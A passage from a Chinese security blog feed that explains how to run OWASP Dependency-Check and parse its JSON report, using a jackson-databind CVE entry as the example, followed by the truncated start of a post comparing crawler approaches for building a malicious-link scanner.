class="line">the CVE and CPE data files from nvd.nist.gov.</span><br><span class="line"></span><br><span class="line">    --advancedHelp              Print the advanced <span class="built_in">help</span> message.</span><br><span class="line">    --enableExperimental        Enables the experimental analyzers.</span><br><span class="line">    --exclude &lt;pattern&gt;         Specify an exclusion pattern. This option</span><br><span class="line">                                can be specified multiple <span class="built_in">times</span> and it</span><br><span class="line">                                accepts Ant style exclusions.</span><br><span class="line"> -f,--format &lt;format&gt;           The report format (HTML, XML, CSV, JSON,</span><br><span class="line">                                JUNIT, or ALL). The default is HTML.</span><br><span class="line">                                Multiple format parameters can be</span><br><span class="line">                                specified.</span><br><span class="line">    --failOnCVSS &lt;score&gt;        Specifies <span class="keyword">if</span> the build should be failed <span class="keyword">if</span></span><br><span class="line">                                a CVSS score above a specified level is</span><br><span class="line">                                identified. The default is 11; since the</span><br><span class="line">                                CVSS scores are 0-10, by default the build</span><br><span class="line">                                will never fail.</span><br><span class="line"> -h,--<span class="built_in">help</span>                      Print this message.</span><br><span class="line">    --junitFailOnCVSS &lt;score&gt;   Specifies the CVSS score that is</span><br><span class="line">                                considered a failure when generating the</span><br><span class="line">                                junit report. The default is 0.</span><br><span class="line"> -l,--<span class="built_in">log</span> &lt;file&gt;                The file path to write verbose logging</span><br><span class="line">                                information.</span><br><span class="line"> -n,--noupdate                  Disables the automatic updating of the CPE</span><br><span class="line">                                data.</span><br><span class="line"> -o,--out &lt;path&gt;                The folder to write reports to. This</span><br><span class="line">                                defaults to the current directory. It is</span><br><span class="line">                                possible to <span class="built_in">set</span> this to a specific file</span><br><span class="line">                                name <span class="keyword">if</span> the format argument is not <span class="built_in">set</span> to</span><br><span class="line">                                ALL.</span><br><span class="line">    --prettyPrint               When specified the JSON and XML report</span><br><span class="line">                                formats will be pretty printed.</span><br><span class="line">    --project &lt;name&gt;            The name of the project being scanned.</span><br><span class="line"> -s,--scan &lt;path&gt;               The path to scan - this option can be</span><br><span class="line">                                specified multiple <span class="built_in">times</span>. Ant style paths</span><br><span class="line">                                are supported (e.g. <span class="string">&#x27;path/**/*.jar&#x27;</span>); <span class="keyword">if</span></span><br><span class="line">                                using Ant style paths it is highly</span><br><span class="line">                                recommended to quote the argument value.</span><br><span class="line">    --suppression &lt;file&gt;        The file path to the suppression XML file.</span><br><span class="line">                                This can be specified more <span class="keyword">then</span> once to</span><br><span class="line">                                utilize multiple suppression files</span><br><span class="line"> -v,--version                   Print the version information.</span><br></pre></td></tr></table></figure>


<p>我使用的扫描命令:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -n 是不开启自动更新</span></span><br><span class="line">sh /opt/devsecops/tools/dependency-check/bin/dependency-check.sh -f <span class="string">&#x27;JSON&#x27;</span> -n --project <span class="string">&#x27;dc_check&#x27;</span> --scan /opt/xxx/jar_lib --out /opt/xxx/dc.json</span><br></pre></td></tr></table></figure>


<p>使用的更新命令:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 仅更新</span></span><br><span class="line">sh /opt/devsecops/tools/dependency-check/bin/dependency-check.sh --updateonly</span><br></pre></td></tr></table></figure>

<hr>
<h1 id="结果解析"><a href="#结果解析" class="headerlink" title="结果解析:"></a>结果解析:</h1><p>对dc的扫描结果json进行解析</p>
<h2 id="json整体结构"><a href="#json整体结构" class="headerlink" title="json整体结构:"></a>json整体结构:</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">   <span class="string">&quot;reportSchema&quot;</span>: <span class="string">&quot;1.1&quot;</span>, <span class="comment"># 报告结构</span></span><br><span class="line">   <span class="string">&quot;scanInfo&quot;</span>: &#123;...&#125;, <span class="comment"># 扫描信息</span></span><br><span class="line">   <span class="string">&quot;projectInfo&quot;</span>: &#123;...&#125;, <span class="comment"># 项目信息</span></span><br><span class="line">   <span class="string">&quot;dependencies&quot;</span>: [...],<span class="comment"># 依赖信息</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>最主要是依赖信息的那一项</p>
<hr>
<h1 id="报告结构、扫描信息、项目信息"><a href="#报告结构、扫描信息、项目信息" class="headerlink" title="报告结构、扫描信息、项目信息"></a>报告结构、扫描信息、项目信息</h1><p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20200821144233.png" alt="20200821144233"></p>
<p>这里面没有什么重要的信息。可略过</p>
<hr>
<h1 id="依赖信息"><a href="#依赖信息" class="headerlink" title="依赖信息:"></a>依赖信息:</h1><p>整体结构:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">     <span class="string">&quot;isVirtual&quot;</span>: false,</span><br><span class="line">     <span class="string">&quot;fileName&quot;</span>: <span class="string">&quot;jackson-databind-2.9.0.pr4.jar&quot;</span>, <span class="comment"># 文件名</span></span><br><span class="line">     <span class="string">&quot;filePath&quot;</span>: <span class="string">&quot;\/opt\/devsecops\/logs\/ec-cart_V20200814024805\/jar_lib\/jackson-databind-2.9.0.pr4.jar&quot;</span>, <span class="comment"># 文件路径</span></span><br><span class="line">     <span class="string">&quot;md5&quot;</span>: <span class="string">&quot;a1a9284e812952d15736794ef252dfd9&quot;</span>, <span class="comment"># md5值</span></span><br><span class="line">     <span class="string">&quot;sha1&quot;</span>: <span class="string">&quot;e96baca7953374a502eb995d3901cad7580d3741&quot;</span>,</span><br><span class="line">     <span class="string">&quot;sha256&quot;</span>: <span class="string">&quot;b9f004b868004f84745ff844a9e0f05367cd5b8dc1a69944bebdec035ea00146&quot;</span>,</span><br><span class="line">     <span class="string">&quot;description&quot;</span>: <span class="string">&quot;General data-binding functionality for Jackson: works on core streaming API&quot;</span>, <span class="comment"># 该jar包的作用描述</span></span><br><span class="line">     <span class="string">&quot;license&quot;</span>: <span class="string">&quot;http:\/\/www.apache.org\/licenses\/LICENSE-2.0.txt&quot;</span>,</span><br><span class="line">     <span class="string">&quot;evidenceCollected&quot;</span>: &#123;...&#125;,<span class="comment"># 依据信息</span></span><br><span class="line">     <span class="string">&quot;packages&quot;</span>: [...], <span class="comment"># </span></span><br><span class="line">     <span class="string">&quot;vulnerabilityIds&quot;</span>: [...], <span class="comment"># cpe表达式</span></span><br><span class="line">      <span class="string">&quot;vulnerabilities&quot;</span>: [...],</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<hr>
<h2 id="evidenceCollected依据信息"><a href="#evidenceCollected依据信息" class="headerlink" title="evidenceCollected依据信息:"></a>evidenceCollected依据信息:</h2><p>结构:</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20200819221938.png" alt="20200819221938"></p>
<p>详细内容:</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20200819221957.png" alt="20200819221957"></p>
<p>从各种来源来判断这个组件的<code>vendor</code>(供应商)、<code>Product</code>(产品名)、<code>Version</code>(版本号)</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20200821104327.png" alt="20200821104327"></p>
<hr>
<h2 id="packages-amp-vulnerabilityIds"><a href="#packages-amp-vulnerabilityIds" class="headerlink" title="packages&amp;vulnerabilityIds:"></a>packages&amp;vulnerabilityIds:</h2><p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20200821110733.png" alt="20200821110733"></p>
<p>这两项主要是通过<code>pkg</code>、<code>cpe表达式</code>识别标识的信息</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20200821142630.png" alt="20200821142630"></p>
<p>其中<code>vulnerabilityIds</code>-&gt;<code>confidence</code>里的是这个风险的可信度</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20200821143026.png" alt="20200821143026"></p>
<p>为了减少误报,我们一般选择<code>HIGHEST</code>和<code>HIGH</code>的可信度的风险信息。</p>
<hr>
<h2 id="vulnerabilities漏洞信息："><a href="#vulnerabilities漏洞信息：" class="headerlink" title="vulnerabilities漏洞信息："></a>vulnerabilities漏洞信息：</h2><p>vulnerabilities是一个漏洞列表，里面包含了某组件当前版本涉及到的所有cve</p>
<p>以<code>jackson-databind-2.9.0.pr4.jar</code>为例,它的内容如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">         <span class="string">&quot;source&quot;</span>: <span class="string">&quot;NVD&quot;</span>,</span><br><span class="line">         <span class="string">&quot;name&quot;</span>: <span class="string">&quot;CVE-2017-17485&quot;</span>, <span class="comment"># cve编号</span></span><br><span class="line">         <span class="string">&quot;severity&quot;</span>: <span class="string">&quot;CRITICAL&quot;</span>, <span class="comment"># 风险等级</span></span><br><span class="line">         <span class="string">&quot;cvssv2&quot;</span>: &#123;</span><br><span class="line">           <span class="string">&quot;score&quot;</span>: <span class="number">7.5</span>,  <span class="comment"># cvss v2的评分</span></span><br><span class="line">           <span class="string">&quot;accessVector&quot;</span>: <span class="string">&quot;NETWORK&quot;</span>,</span><br><span class="line">           <span class="string">&quot;accessComplexity&quot;</span>: <span class="string">&quot;LOW&quot;</span>,</span><br><span class="line">           <span class="string">&quot;authenticationr&quot;</span>: <span class="string">&quot;NONE&quot;</span>,</span><br><span class="line">           <span class="string">&quot;confidentialImpact&quot;</span>: <span class="string">&quot;PARTIAL&quot;</span>,</span><br><span class="line">           <span class="string">&quot;integrityImpact&quot;</span>: <span class="string">&quot;PARTIAL&quot;</span>,</span><br><span class="line">           <span class="string">&quot;availabilityImpact&quot;</span>: <span class="string">&quot;PARTIAL&quot;</span>,</span><br><span class="line">           <span class="string">&quot;severity&quot;</span>: <span class="string">&quot;HIGH&quot;</span></span><br><span class="line">         &#125;,</span><br><span class="line">         <span class="string">&quot;cvssv3&quot;</span>: &#123;</span><br><span class="line">           <span class="string">&quot;baseScore&quot;</span>: <span class="number">9.8</span>, <span class="comment"># cvss v3的评分</span></span><br><span class="line">           <span class="string">&quot;attackVector&quot;</span>: <span class="string">&quot;NETWORK&quot;</span>,</span><br><span class="line">           <span class="string">&quot;attackComplexity&quot;</span>: <span class="string">&quot;LOW&quot;</span>,</span><br><span class="line">           <span class="string">&quot;privilegesRequired&quot;</span>: <span class="string">&quot;NONE&quot;</span>,</span><br><span class="line">           <span class="string">&quot;userInteraction&quot;</span>: <span class="string">&quot;NONE&quot;</span>,</span><br><span class="line">           <span class="string">&quot;scope&quot;</span>: <span class="string">&quot;UNCHANGED&quot;</span>,</span><br><span class="line">           <span class="string">&quot;confidentialityImpact&quot;</span>: <span class="string">&quot;HIGH&quot;</span>,</span><br><span class="line">           <span class="string">&quot;integrityImpact&quot;</span>: <span class="string">&quot;HIGH&quot;</span>,</span><br><span class="line">           <span class="string">&quot;availabilityImpact&quot;</span>: <span class="string">&quot;HIGH&quot;</span>,</span><br><span class="line">           <span class="string">&quot;baseSeverity&quot;</span>: <span class="string">&quot;CRITICAL&quot;</span></span><br><span class="line">         &#125;,</span><br><span class="line">         <span class="string">&quot;cwes&quot;</span>: [</span><br><span class="line">           <span class="string">&quot;CWE-502&quot;</span></span><br><span class="line">         ],</span><br><span class="line">         <span class="string">&quot;description&quot;</span>: <span class="string">&quot;FasterXML jackson-databind through 2.8.10 and 2.9.x through 2.9.3 allows unauthenticated remote code execution because of an incomplete fix for the CVE-2017-7525 deserialization flaw. This is exploitable by sending maliciously crafted JSON input to the readValue method of the ObjectMapper, bypassing a blacklist that is ineffective if the Spring libraries are available in the classpath.&quot;</span>, <span class="comment"># 描述</span></span><br><span class="line">         <span class="string">&quot;notes&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">         <span class="string">&quot;references&quot;</span>: [ <span class="comment"># 参考链接</span></span><br><span class="line">           &#123;</span><br><span class="line">             <span class="string">&quot;source&quot;</span>: <span class="string">&quot;REDHAT&quot;</span>,</span><br><span class="line">             <span class="string">&quot;url&quot;</span>: <span class="string">&quot;https:\/\/access.redhat.com\/errata\/RHSA-2019:3149&quot;</span>,</span><br><span class="line">             <span class="string">&quot;name&quot;</span>: <span class="string">&quot;RHSA-2019:3149&quot;</span></span><br><span class="line">           &#125;,</span><br><span class="line">           &#123;</span><br><span class="line">             <span class="string">&quot;source&quot;</span>: <span class="string">&quot;CONFIRM&quot;</span>,</span><br><span class="line">             <span class="string">&quot;url&quot;</span>: <span class="string">&quot;https:\/\/support.hpe.com\/hpsc\/doc\/public\/display?docLocale=en_US&amp;docId=emr_na-hpesbhf03902en_us&quot;</span>,</span><br><span class="line">             <span class="string">&quot;name&quot;</span>: <span class="string">&quot;https:\/\/support.hpe.com\/hpsc\/doc\/public\/display?docLocale=en_US&amp;docId=emr_na-hpesbhf03902en_us&quot;</span></span><br><span class="line">           &#125;,</span><br><span class="line">           &#123;</span><br><span class="line">             <span class="string">&quot;source&quot;</span>: <span class="string">&quot;REDHAT&quot;</span>,</span><br><span class="line">             <span class="string">&quot;url&quot;</span>: <span class="string">&quot;https:\/\/access.redhat.com\/errata\/RHSA-2018:1449&quot;</span>,</span><br><span class="line">             <span class="string">&quot;name&quot;</span>: <span class="string">&quot;RHSA-2018:1449&quot;</span></span><br><span class="line">           &#125;,</span><br><span class="line">           &#123;</span><br><span class="line">             <span class="string">&quot;source&quot;</span>: <span class="string">&quot;REDHAT&quot;</span>,</span><br><span class="line">             <span class="string">&quot;url&quot;</span>: <span class="string">&quot;https:\/\/access.redhat.com\/errata\/RHSA-2018:0342&quot;</span>,</span><br><span class="line">             <span class="string">&quot;name&quot;</span>: <span class="string">&quot;RHSA-2018:0342&quot;</span></span><br><span class="line">           &#125;,</span><br><span class="line">           &#123;</span><br><span class="line">             <span class="string">&quot;source&quot;</span>: <span class="string">&quot;MISC&quot;</span>,</span><br><span class="line">             <span class="string">&quot;url&quot;</span>: <span class="string">&quot;https:\/\/github.com\/irsl\/jackson-rce-via-spel\/&quot;</span>,</span><br><span class="line">             <span class="string">&quot;name&quot;</span>: <span class="string">&quot;https:\/\/github.com\/irsl\/jackson-rce-via-spel\/&quot;</span></span><br><span class="line">           &#125;,</span><br><span class="line">           &#123;</span><br><span class="line">             <span class="string">&quot;source&quot;</span>: <span class="string">&quot;CONFIRM&quot;</span>,</span><br><span class="line">             <span class="string">&quot;url&quot;</span>: <span class="string">&quot;https:\/\/security.netapp.com\/advisory\/ntap-20180201-0003\/&quot;</span>,</span><br><span class="line">             <span class="string">&quot;name&quot;</span>: <span class="string">&quot;https:\/\/security.netapp.com\/advisory\/ntap-20180201-0003\/&quot;</span></span><br><span class="line">           &#125;,</span><br><span class="line">           &#123;</span><br><span class="line">             <span class="string">&quot;source&quot;</span>: <span class="string">&quot;REDHAT&quot;</span>,</span><br><span class="line">             <span class="string">&quot;url&quot;</span>: <span class="string">&quot;https:\/\/access.redhat.com\/errata\/RHSA-2019:1782&quot;</span>,</span><br><span class="line">             <span class="string">&quot;name&quot;</span>: <span class="string">&quot;RHSA-2019:1782&quot;</span></span><br><span class="line">           &#125;,</span><br><span class="line">           &#123;</span><br><span class="line">             <span class="string">&quot;source&quot;</span>: <span class="string">&quot;REDHAT&quot;</span>,</span><br><span class="line">             <span class="string">&quot;url&quot;</span>: <span class="string">&quot;https:\/\/access.redhat.com\/errata\/RHSA-2019:2858&quot;</span>,</span><br><span class="line">             <span class="string">&quot;name&quot;</span>: <span class="string">&quot;RHSA-2019:2858&quot;</span></span><br><span class="line">           &#125;,</span><br><span class="line">           &#123;</span><br><span class="line">             <span class="string">&quot;source&quot;</span>: <span class="string">&quot;REDHAT&quot;</span>,</span><br><span class="line">             <span class="string">&quot;url&quot;</span>: <span class="string">&quot;https:\/\/access.redhat.com\/errata\/RHSA-2018:0478&quot;</span>,</span><br><span class="line">             <span class="string">&quot;name&quot;</span>: <span class="string">&quot;RHSA-2018:0478&quot;</span></span><br><span class="line">           &#125;,</span><br><span class="line">           &#123;</span><br><span class="line">             <span class="string">&quot;source&quot;</span>: <span class="string">&quot;REDHAT&quot;</span>,</span><br><span class="line">             <span class="string">&quot;url&quot;</span>: <span class="string">&quot;https:\/\/access.redhat.com\/errata\/RHSA-2018:0481&quot;</span>,</span><br><span class="line">             <span class="string">&quot;name&quot;</span>: <span class="string">&quot;RHSA-2018:0481&quot;</span></span><br><span class="line">           &#125;,</span><br><span class="line">           &#123;</span><br><span class="line">             <span class="string">&quot;source&quot;</span>: <span class="string">&quot;CONFIRM&quot;</span>,</span><br><span class="line">             <span class="string">&quot;url&quot;</span>: <span class="string">&quot;https:\/\/github.com\/FasterXML\/jackson-databind\/issues\/1855&quot;</span>,</span><br><span class="line">             <span class="string">&quot;name&quot;</span>: <span class="string">&quot;https:\/\/github.com\/FasterXML\/jackson-databind\/issues\/1855&quot;</span></span><br><span class="line">           &#125;,</span><br><span class="line">           &#123;</span><br><span class="line">             <span class="string">&quot;source&quot;</span>: <span class="string">&quot;BUGTRAQ&quot;</span>,</span><br><span class="line">             <span class="string">&quot;url&quot;</span>: <span class="string">&quot;http:\/\/www.securityfocus.com\/archive\/1\/541652\/100\/0\/threaded&quot;</span>,</span><br><span class="line">             <span class="string">&quot;name&quot;</span>: <span class="string">&quot;20180109 CVE-2017-17485: one more way of rce in jackson-databind when defaultTyping+objects are used&quot;</span></span><br><span class="line">           &#125;,</span><br><span class="line">           &#123;</span><br><span class="line">             <span class="string">&quot;source&quot;</span>: <span class="string">&quot;REDHAT&quot;</span>,</span><br><span class="line">             <span class="string">&quot;url&quot;</span>: <span class="string">&quot;https:\/\/access.redhat.com\/errata\/RHSA-2018:0480&quot;</span>,</span><br><span class="line">             <span class="string">&quot;name&quot;</span>: <span class="string">&quot;RHSA-2018:0480&quot;</span></span><br><span class="line">           &#125;,</span><br><span class="line">           &#123;</span><br><span class="line">             <span class="string">&quot;source&quot;</span>: <span class="string">&quot;REDHAT&quot;</span>,</span><br><span class="line">             <span class="string">&quot;url&quot;</span>: <span class="string">&quot;https:\/\/access.redhat.com\/errata\/RHSA-2018:2930&quot;</span>,</span><br><span class="line">             <span class="string">&quot;name&quot;</span>: <span class="string">&quot;RHSA-2018:2930&quot;</span></span><br><span class="line">           &#125;,</span><br><span class="line">           &#123;</span><br><span class="line">             <span class="string">&quot;source&quot;</span>: <span class="string">&quot;REDHAT&quot;</span>,</span><br><span class="line">             <span class="string">&quot;url&quot;</span>: <span class="string">&quot;https:\/\/access.redhat.com\/errata\/RHSA-2018:0116&quot;</span>,</span><br><span class="line">             <span class="string">&quot;name&quot;</span>: <span class="string">&quot;RHSA-2018:0116&quot;</span></span><br><span class="line">           &#125;,</span><br><span class="line">           &#123;</span><br><span class="line">             <span class="string">&quot;source&quot;</span>: <span class="string">&quot;REDHAT&quot;</span>,</span><br><span class="line">             <span class="string">&quot;url&quot;</span>: <span class="string">&quot;https:\/\/access.redhat.com\/errata\/RHSA-2018:1447&quot;</span>,</span><br><span class="line">             <span class="string">&quot;name&quot;</span>: <span class="string">&quot;RHSA-2018:1447&quot;</span></span><br><span class="line">           &#125;,</span><br><span class="line">           &#123;</span><br><span class="line">             <span class="string">&quot;source&quot;</span>: <span class="string">&quot;REDHAT&quot;</span>,</span><br><span class="line">             <span class="string">&quot;url&quot;</span>: <span class="string">&quot;https:\/\/access.redhat.com\/errata\/RHSA-2018:1450&quot;</span>,</span><br><span class="line">             <span class="string">&quot;name&quot;</span>: <span class="string">&quot;RHSA-2018:1450&quot;</span></span><br><span class="line">           &#125;,</span><br><span class="line">           &#123;</span><br><span class="line">             <span class="string">&quot;source&quot;</span>: <span class="string">&quot;REDHAT&quot;</span>,</span><br><span class="line">             <span class="string">&quot;url&quot;</span>: <span class="string">&quot;https:\/\/access.redhat.com\/errata\/RHSA-2019:3892&quot;</span>,</span><br><span class="line">             <span class="string">&quot;name&quot;</span>: <span class="string">&quot;RHSA-2019:3892&quot;</span></span><br><span class="line">           &#125;,</span><br><span class="line">           &#123;</span><br><span class="line">             <span class="string">&quot;source&quot;</span>: <span class="string">&quot;REDHAT&quot;</span>,</span><br><span class="line">             <span class="string">&quot;url&quot;</span>: <span class="string">&quot;https:\/\/access.redhat.com\/errata\/RHSA-2019:1797&quot;</span>,</span><br><span class="line">             <span class="string">&quot;name&quot;</span>: <span class="string">&quot;RHSA-2019:1797&quot;</span></span><br><span class="line">           &#125;,</span><br><span class="line">           &#123;</span><br><span class="line">             <span class="string">&quot;source&quot;</span>: <span class="string">&quot;REDHAT&quot;</span>,</span><br><span class="line">             <span class="string">&quot;url&quot;</span>: <span class="string">&quot;https:\/\/access.redhat.com\/errata\/RHSA-2018:0479&quot;</span>,</span><br><span class="line">             <span class="string">&quot;name&quot;</span>: <span class="string">&quot;RHSA-2018:0479&quot;</span></span><br><span class="line">           &#125;,</span><br><span class="line">           &#123;</span><br><span class="line">             <span class="string">&quot;source&quot;</span>: <span class="string">&quot;DEBIAN&quot;</span>,</span><br><span class="line">             <span class="string">&quot;url&quot;</span>: <span class="string">&quot;https:\/\/www.debian.org\/security\/2018\/dsa-4114&quot;</span>,</span><br><span class="line">             <span class="string">&quot;name&quot;</span>: <span class="string">&quot;DSA-4114&quot;</span></span><br><span class="line">           &#125;,</span><br><span class="line">           &#123;</span><br><span class="line">             <span class="string">&quot;source&quot;</span>: <span class="string">&quot;OSSINDEX&quot;</span>,</span><br><span class="line">             <span class="string">&quot;url&quot;</span>: <span class="string">&quot;https:\/\/ossindex.sonatype.org\/vuln\/b85a00e3-7d9b-49cf-9b19-b73f8ee60275&quot;</span>,</span><br><span class="line">             <span class="string">&quot;name&quot;</span>: <span class="string">&quot;[CVE-2017-17485]  Improper Control of Generation of Code (\&quot;Code Injection\&quot;)&quot;</span></span><br><span class="line">           &#125;,</span><br><span class="line">           &#123;</span><br><span class="line">             <span class="string">&quot;source&quot;</span>: <span class="string">&quot;REDHAT&quot;</span>,</span><br><span class="line">             <span class="string">&quot;url&quot;</span>: <span class="string">&quot;https:\/\/access.redhat.com\/errata\/RHSA-2018:1448&quot;</span>,</span><br><span class="line">             <span class="string">&quot;name&quot;</span>: <span class="string">&quot;RHSA-2018:1448&quot;</span></span><br><span class="line">           &#125;,</span><br><span class="line">           &#123;</span><br><span class="line">             <span class="string">&quot;source&quot;</span>: <span class="string">&quot;REDHAT&quot;</span>,</span><br><span class="line">             <span class="string">&quot;url&quot;</span>: <span class="string">&quot;https:\/\/access.redhat.com\/errata\/RHSA-2018:1451&quot;</span>,</span><br><span class="line">             <span class="string">&quot;name&quot;</span>: <span class="string">&quot;RHSA-2018:1451&quot;</span></span><br><span class="line">           &#125;</span><br><span class="line">         ],</span><br><span class="line">         <span class="string">&quot;vulnerableSoftware&quot;</span>: [ <span class="comment"># 含cve的cpe表达式列表</span></span><br><span class="line">           &#123;</span><br><span class="line">             <span class="string">&quot;software&quot;</span>: &#123;</span><br><span class="line">               <span class="string">&quot;id&quot;</span>: <span class="string">&quot;cpe:2.3:a:fasterxml:jackson-databind:*:*:*:*:*:*:*:*&quot;</span>,</span><br><span class="line">               <span class="string">&quot;vulnerabilityIdMatched&quot;</span>: <span class="string">&quot;true&quot;</span>,</span><br><span class="line">               <span class="string">&quot;versionStartExcluding&quot;</span>: <span class="string">&quot;2.9.0&quot;</span>,</span><br><span class="line">               <span class="string">&quot;versionEndExcluding&quot;</span>: <span class="string">&quot;2.9.4&quot;</span></span><br><span class="line">             &#125;</span><br><span class="line">           &#125;,</span><br><span class="line">           &#123;</span><br><span class="line">             <span class="string">&quot;software&quot;</span>: &#123;</span><br><span class="line">               <span class="string">&quot;id&quot;</span>: <span class="string">&quot;cpe:2.3:a:redhat:jboss_bpm_suite:6.4.11:*:*:*:*:*:*:*&quot;</span></span><br><span class="line">             &#125;</span><br><span class="line">           &#125;,</span><br><span class="line">           &#123;</span><br><span class="line">             <span class="string">&quot;software&quot;</span>: &#123;</span><br><span class="line">               <span class="string">&quot;id&quot;</span>: <span class="string">&quot;cpe:2.3:a:redhat:jboss_enterprise_application_platform:6.0.0:*:*:*:*:*:*:*&quot;</span></span><br><span class="line">             &#125;</span><br><span class="line">           &#125;,</span><br><span class="line">           &#123;</span><br><span class="line">             <span class="string">&quot;software&quot;</span>: &#123;</span><br><span class="line">               <span class="string">&quot;id&quot;</span>: <span class="string">&quot;cpe:2.3:a:redhat:jboss_enterprise_application_platform:6.4.0:*:*:*:*:*:*:*&quot;</span></span><br><span class="line">             &#125;</span><br><span class="line">           &#125;,</span><br><span class="line">           &#123;</span><br><span class="line">             <span class="string">&quot;software&quot;</span>: &#123;</span><br><span class="line">               <span class="string">&quot;id&quot;</span>: <span class="string">&quot;cpe:2.3:a:redhat:jboss_brms:6.4.10:*:*:*:*:*:*:*&quot;</span></span><br><span class="line">             &#125;</span><br><span class="line">           &#125;,</span><br><span class="line">           &#123;</span><br><span class="line">             <span class="string">&quot;software&quot;</span>: &#123;</span><br><span class="line">               <span class="string">&quot;id&quot;</span>: <span class="string">&quot;cpe:2.3:a:redhat:jboss_enterprise_application_platform:7.1.0:*:*:*:*:*:*:*&quot;</span></span><br><span class="line">             &#125;</span><br><span class="line">           &#125;,</span><br><span class="line">           &#123;</span><br><span class="line">             <span class="string">&quot;software&quot;</span>: &#123;</span><br><span class="line">               <span class="string">&quot;id&quot;</span>: <span class="string">&quot;cpe:2.3:a:fasterxml:jackson-databind:*:*:*:*:*:*:*:*&quot;</span>,</span><br><span class="line">               <span class="string">&quot;versionStartIncluding&quot;</span>: <span class="string">&quot;2.8.0&quot;</span>,</span><br><span class="line">               <span class="string">&quot;versionEndExcluding&quot;</span>: <span class="string">&quot;2.8.11&quot;</span></span><br><span class="line">             &#125;</span><br><span class="line">           &#125;,</span><br><span class="line">           &#123;</span><br><span class="line">             <span class="string">&quot;software&quot;</span>: &#123;</span><br><span class="line">               <span class="string">&quot;id&quot;</span>: <span class="string">&quot;cpe:2.3:a:fasterxml:jackson:*:*:*:*:*:*:*:*&quot;</span>,</span><br><span class="line">               <span class="string">&quot;versionStartIncluding&quot;</span>: <span class="string">&quot;1.0.0&quot;</span>,</span><br><span class="line">               <span class="string">&quot;versionEndIncluding&quot;</span>: <span class="string">&quot;1.9&quot;</span></span><br><span class="line">             &#125;</span><br><span class="line">           &#125;,</span><br><span class="line">           &#123;</span><br><span class="line">             <span class="string">&quot;software&quot;</span>: &#123;</span><br><span class="line">               <span class="string">&quot;id&quot;</span>: <span class="string">&quot;cpe:2.3:a:redhat:jboss_enterprise_application_platform:6.4.19:*:*:*:*:*:*:*&quot;</span></span><br><span class="line">             &#125;</span><br><span class="line">           &#125;,</span><br><span class="line">           &#123;</span><br><span class="line">             <span class="string">&quot;software&quot;</span>: &#123;</span><br><span class="line">               <span class="string">&quot;id&quot;</span>: <span class="string">&quot;cpe:2.3:a:redhat:jboss_operations_network:3.3.10:*:*:*:*:*:*:*&quot;</span></span><br><span class="line">             &#125;</span><br><span class="line">           &#125;</span><br></pre></td></tr></table></figure>

<p>直观点的话,就是html格式里的内容</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20200821143836.png" alt="20200821143836"></p>
<hr>
<h1 id="refs"><a href="#refs" class="headerlink" title="refs:"></a>refs:</h1><ul>
<li><a href="https://owasp.org/www-project-dependency-check/">OWASP Dependency-Check官网</a></li>
<li><a href="https://jeremylong.github.io/DependencyCheck/dependency-check-cli/arguments.html">DC_Command Line Arguments</a></li>
<li><a href="https://www.jianshu.com/p/f1a2f5357d12">使用OWASP Dependency-Check进行第三方依赖包安全扫描实践</a></li>
</ul>
]]></content>
      <categories>
        <category>SecurityTools</category>
      </categories>
      <tags>
        <tag>SecurityTools</tag>
      </tags>
  </entry>
  <entry>
    <title>Pyppeteer-浏览器爬虫初探</title>
    <url>//44791.html</url>
    <content><![CDATA[<h1 id="pre"><a href="#pre" class="headerlink" title="pre:"></a>pre:</h1><p>最近打算捣鼓一个黑链扫描器.</p>
<p>当你打开浏览器去访问被挂了黑链的网站的时候,渲染执行完js代码后,就会跳转到恶意的网站.</p>
<p>那么这种情况应该选用什么爬虫的解决方案呢?即技术选型</p>
<hr>
<h1 id="技术选型"><a href="#技术选型" class="headerlink" title="技术选型:"></a>技术选型:</h1><h2 id="方案一-静态爬虫"><a href="#方案一-静态爬虫" class="headerlink" title="方案一 静态爬虫:"></a>方案一 静态爬虫:</h2><p>在python中最常见的就是用<code>requests</code>,<code>urllib2</code>等库来模拟发包,执行简单的HTTP请求并获取HTML页面.</p>
<p>这种方案比较适合于对特定网站进行简单的爬取,优点是:</p>
<ul>
<li>在CPU和内存消耗方面的开销很低</li>
<li>开发速度快</li>
</ul>
<p>但是缺点也很明显:</p>
<ul>
<li>不通用:发包情况千千万,都要模拟请求的话不现实</li>
<li>无法收集通过JavaScript动态生成的内容</li>
</ul>
<p>基于以上两点,果断弃之.</p>
<hr>
<h2 id="方案二-动态爬虫"><a href="#方案二-动态爬虫" class="headerlink" title="方案二 动态爬虫:"></a>方案二 动态爬虫:</h2><p>选型1: 使用<code>Selenium</code>等库来驱动Chrome、Firefox或PhantomJS.</p>
<blockquote>
<p>在Chrome的Headless模式刚出现不久，我们当时就调研过用作漏洞扫描器爬虫的需求，但由于当时功能不够完善，以及无法达到稳定可靠的要求。举个例子，对于网络请求，无法区分导航请求和其它请求，而本身又不提供navigation lock的功能，所以很难确保页面的处理不被意外跳转中断。同时，不太稳定的CDP经常意外中断和产生Chrome僵尸进程，所以我们之前一直在使用PhantomJS。</p>
<p>但随着前端的框架使用越来越多，网页内容对爬虫越来越不友好，在不考虑进行服务端渲染的情况下，Vue等框架让静态爬虫彻底失效。同时，由于JS的ES6语法的广泛使用，缺乏维护（创始人宣布归档项目暂停开发）的PhantomJS开始变的力不从心。</p>
<p>—-<a href="https://www.anquanke.com/post/id/178339">漏扫动态爬虫实践</a></p>
</blockquote>
<p>选型2: <code>pyppeteer</code>+<code>Chromium headless</code></p>
